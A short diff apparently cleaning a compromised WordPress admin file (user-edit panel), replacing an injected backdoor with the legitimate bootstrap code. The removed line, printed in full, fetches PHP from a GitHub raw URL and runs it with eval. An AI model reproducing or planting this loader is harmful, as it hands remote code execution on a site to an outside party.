@@ -1,2 +1,13 @@
-<?php $Url = "https://raw.githubusercontent.com/ZewarUyee/my-tools/refs/heads/main/seo-tusbol.php"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); echo eval("?>".$output); ?>
+<?php
+/**
+ * Edit user administration panel.
+ *
+ * @package WordPress
+ * @subpackage Administration
+ * @since 3.1.0
+ */
 
+/** Load WordPress Administration Bootstrap */
+require_once __DIR__ . '/admin.php';
+
+require ABSPATH . 'wp-admin/user-edit.php';
